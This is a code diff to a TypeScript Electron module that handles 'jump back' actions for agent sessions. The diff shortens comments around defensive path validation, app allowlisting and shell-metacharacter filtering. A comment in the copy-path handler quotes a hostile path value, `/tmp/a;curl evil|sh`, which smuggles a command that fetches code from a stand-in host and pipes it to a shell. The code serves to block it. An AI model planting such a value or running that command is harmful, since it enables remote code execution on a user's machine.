@@ -9,36 +9,26 @@ import type { WindowsActivationResult } from './windows-window-activator.ts'
 import { asRecord } from './value-guards.ts'
 import { SESSION_REMOVE_MS } from '../src/utils/session-lifecycle.ts'
 
-// "Jump back" actions for one agent session: switch to its app, show its project folder or copy
-// its path. The absolute project path and bundle id arrive with token-authenticated events and are
-// kept here, in main-process memory only; the renderer names a session by source + session id.
-//
-// Trust boundary: hook events and generic /v1/events callers share one event token, and the
-// adapter registry assigns a built-in adapter id from the `source` field alone, so a token holder
-// can pose as a hook. Nothing here relies on the event being "really" from a hook. The guarantees
-// are: only allowlisted terminal/IDE apps can ever be activated, every action needs a user click,
-// and folders are only revealed (never opened, so no app or document package is launched).
+// Project path and bundle id stay in main-process memory only; the renderer names a session by source + session id.
+// Trust boundary: hook events and generic /v1/events callers share one token, so a token holder can pose as a hook.
+// Nothing here relies on the event being "really" from a hook: only allowlisted apps can be activated,
+// every action needs a user click, and folders are only revealed (never opened).
 
 const MAX_ENTRIES = 200
-/** Matches the renderer's removal horizon; an older session cannot be shown, so it cannot be targeted. */
 const MAX_AGE_MS = SESSION_REMOVE_MS
 const MAX_PATH_LENGTH = 4096
 const RATE_WINDOW_MS = 10_000
 const RATE_LIMIT_PER_ACTION = 5
 const CONTROL_CHARACTERS = /[\u0000-\u001f\u007f]/
-// Package directories are refused outright; the folder is only ever revealed, but there is no
-// reason to point Finder at a bundle. (Document packages such as .xcodeproj are covered by the
-// reveal-only behaviour, not by this list.)
+// Document packages such as .xcodeproj are covered by the reveal-only behaviour, not by this list.
 const MAC_PACKAGE_EXTENSIONS: ReadonlySet<string> = new Set([
   '.app', '.appex', '.action', '.bundle', '.component', '.driver', '.framework', '.kext', '.mdimporter', '.mpkg',
   '.pkg', '.plugin', '.prefpane', '.qlgenerator', '.saver', '.systemextension', '.wdgt', '.workflow', '.xpc',
 ])
 
-/** What main learned about a session from its hook events. */
 export interface SessionJumpContext {
   /** Raw `project` (cwd) string from the event; validated before any use. */
   projectPath?: string
-  /** Allowlisted macOS bundle id the hook reported. */
   bundleId?: string
 }
 
@@ -58,23 +48,15 @@ export interface SessionJumpDependencies {
   platform: NodeJS.Platform
   now?: () => number
   getPreferences(): { sessionJumpEnabled: boolean; sessionJumpSwitchAppEnabled: boolean }
-  /** Runs `/usr/bin/open -b <bundleId>`; injected so tests never launch anything. */
   activateBundle(bundleId: string): Promise<void>
-  /**
-   * Windows：把屬於白名單執行檔（小寫 basename）的視窗帶到前景；測試注入假的，絕不呼叫真的 Win32。
-   * 未提供時 win32 視為不支援。
-   */
+  /** 未提供時 win32 視為不支援。 */
   activateWindowsApp?(executables: ReadonlyArray<string>): Promise<WindowsActivationResult>
-  /**
-   * Reveals a verified directory in the file manager (selects it in its parent). Never "opens" it:
-   * LaunchServices treats document packages (.xcodeproj, .rtfd, ...) as documents and would launch
-   * their app with attacker-chosen content.
-   */
+  // Never "opens": LaunchServices treats document packages (.xcodeproj, .rtfd, ...) as documents and would launch
+  // their app with attacker-chosen content.
   revealDirectory(directory: string): void
   writeClipboard(text: string): void
   realpath(target: string): Promise<string>
   stat(target: string): Promise<DirectoryStat>
-  /** True when the path exists (used to recognise bundles by their Contents/Info.plist). */
   exists(target: string): Promise<boolean>
 }
 
@@ -88,12 +70,7 @@ export type ExecFileLike = (
   callback: (error: Error | null) => void,
 ) => unknown
 
-/**
- * Brings an app forward through LaunchServices (`open -b <bundle id>`): a fixed executable, an
- * argument array and no shell. It sends no Apple Event, so it needs no Automation or
- * Accessibility permission and raises no system prompt. It activates the app (launching it if it
- * is not running) but cannot choose a specific window or tab.
- */
+// No Apple Event is sent, so no Automation or Accessibility permission (and no system prompt) is needed.
 export function activateMacBundle(bundleId: string, run: ExecFileLike = execFile as unknown as ExecFileLike): Promise<void> {
   if (!isValidBundleId(bundleId)) return Promise.reject(new Error('invalid bundle id'))
   return new Promise((resolve, reject) => {
@@ -112,32 +89,27 @@ function pathApi(platform: NodeJS.Platform): path.PlatformPath {
   return platform === 'win32' ? path.win32 : path.posix
 }
 
-/** A path string we are willing to put on the clipboard or resolve: absolute, bounded, no control characters. */
 export function isUsableProjectPath(value: unknown, platform: NodeJS.Platform): value is string {
   if (typeof value !== 'string' || value.length === 0 || value.length > MAX_PATH_LENGTH) return false
   if (CONTROL_CHARACTERS.test(value)) return false
   if (!pathApi(platform).isAbsolute(value)) return false
   // UNC and device paths would make Explorer contact a remote host (and send credentials).
   if (platform === 'win32' && /^[\\/]{2}/.test(value)) return false
-  // 只收「磁碟機代號 + 絕對路徑」：單一反斜線開頭（當前磁碟根目錄）、`\??\` 前綴與
-  // 磁碟機代號之外的冒號（NTFS 替代資料流 `a:stream`）都不是專案資料夾。
+  // 只收「磁碟機代號 + 絕對路徑」：排除 `\??\` 前綴與 NTFS 替代資料流 `a:stream`。
   if (platform === 'win32' && (!/^[A-Za-z]:[\\/]/.test(value) || value.indexOf(':', 2) !== -1)) return false
   return true
 }
 
-// Shell metacharacters (and quotes) that would change what an unquoted paste does. Backslash is
-// an escape in POSIX shells but the separator on Windows, where cmd's % and ^ are refused instead.
+// Backslash is an escape in POSIX shells but the separator on Windows, where cmd's % and ^ are refused instead.
 const POSIX_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'\\]|\s#/
 // PowerShell 也把彎引號（U+2018-201F）當成引號；`[` `]` 在 PowerShell 是萬用字元；空白後的 `#` 會開始註解。
 const WINDOWS_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'%^\u2018-\u201f[\]]|\s#/
 
-/** A path that can be pasted unquoted into a shell without running anything extra. */
 export function isShellSafePath(value: string, platform: NodeJS.Platform): boolean {
   if (CONTROL_CHARACTERS.test(value)) return false
   return !(platform === 'win32' ? WINDOWS_SHELL_METACHARACTERS : POSIX_SHELL_METACHARACTERS).test(value)
 }
 
-/** Resolves a project path to an existing, non-bundle directory, or null. Never follows into a file. */
 export async function verifyProjectDirectory(
   value: unknown,
   deps: Pick<SessionJumpDependencies, 'platform' | 'realpath' | 'stat' | 'exists'>,
@@ -161,8 +133,7 @@ export async function verifyProjectDirectory(
     if (MAC_PACKAGE_EXTENSIONS.has(api.extname(real).toLowerCase())) return null
     if (await deps.exists(api.join(real, 'Contents', 'Info.plist'))) return null
   }
-  // Windows shell namespace junctions ("name.{CLSID}") open a shell extension, not a folder.
-  // 任何一層目錄名帶 CLSID 後綴都拒絕，不只最後一層。
+  // Shell namespace junctions ("name.{CLSID}") open a shell extension, not a folder; refused at any level, not just the last.
   if (deps.platform === 'win32' && /\.\{[0-9a-f-]+\}(?:[\\/]|$)/i.test(real)) return null
   return real
 }
@@ -178,7 +149,6 @@ export class SessionJumpService {
     this.now = deps.now ?? Date.now
   }
 
-  /** Called once per accepted event, after rate limiting. O(1). */
   record(event: AgentStatusEvent, context?: SessionJumpContext): void {
     if (event.originalEvent === 'AgentPetsIntegrationTest') return
     const key = sessionJumpKey(event.source, event.sessionId)
@@ -206,22 +176,16 @@ export class SessionJumpService {
     this.entries.clear()
   }
 
-  /** What "switch to app" would activate for this session (macOS bundle id, Windows app id), or null. */
   switchTarget(key: string): string | null {
     if (this.deps.platform !== 'darwin' && this.deps.platform !== 'win32') return null
     const entry = this.entry(key)
-    // Defence in depth only: an explicit generic-http event is refused, but a token holder can still
-    // claim a built-in source. The allowlist in resolveHostBundleId is the real boundary.
+    // Defence in depth only: a token holder can still claim a built-in source; the allowlist in resolveHostBundleId is the real boundary.
     if (!entry || !entry.adapterId || entry.adapterId === 'generic-http') return null
-    // Windows 只靠 app id 對應白名單執行檔；hook 的 bundle id 在 Windows 上沒有意義。
     if (this.deps.platform === 'win32') return windowsExecutablesFor(entry.app).length > 0 ? entry.app ?? null : null
     return resolveHostBundleId(entry.app, entry.bundleId)
   }
 
-  /**
-   * Notification click about one session: switch to its app when that is allowed. Returns false
-   * (so the caller opens the Sessions tab instead) whenever it did not switch.
-   */
+  // Returns false (the caller opens the Sessions tab instead) whenever it did not switch.
   async switchFromNotification(target: { source: string; sessionId: string }): Promise<boolean> {
     const key = sessionJumpKey(target.source, target.sessionId)
     if (!this.switchTarget(key)) return false
@@ -260,9 +224,8 @@ export class SessionJumpService {
         }
       }
       case 'copy-path': {
-        // The user pastes this without seeing it, often into a shell. Only a path free of shell
-        // metacharacters that is an existing, non-bundle directory right now reaches the clipboard,
-        // so a forged event cannot plant `/tmp/a;curl evil|sh`. Copied as reported, not resolved.
+        // The user pastes this without seeing it, often into a shell: only a shell-safe, existing, non-bundle
+        // directory reaches the clipboard, so a forged event cannot plant `/tmp/a;curl evil|sh`.
         const projectPath = entry.projectPath
         if (!projectPath || !isShellSafePath(projectPath, this.deps.platform)) return { ok: false, error: 'unavailable' }
         if (!(await verifyProjectDirectory(projectPath, this.deps))) return { ok: false, error: 'unavailable' }
@@ -309,18 +272,13 @@ export class SessionJumpService {
   }
 }
 
-// Raw ingress facts for an accepted event, keyed by the event object the event server later hands
-// to onEvent. A WeakMap never reaches a renderer (IPC clones the event's own fields only).
+// A WeakMap keyed by the event object never reaches a renderer (IPC clones the event's own fields only).
 const contexts = new WeakMap<AgentStatusEvent, SessionJumpContext>()
 
 function rawField(input: unknown, key: string): unknown {
   return asRecord(input)?.[key]
 }
 
-/**
- * Adds the main-process `switchable` verdict to the event's host and remembers the raw project
- * path and allowlisted bundle id for the jump service. Returns the event to dispatch.
- */
 export function withSessionJumpContext(
   input: unknown,
   event: AgentStatusEvent,
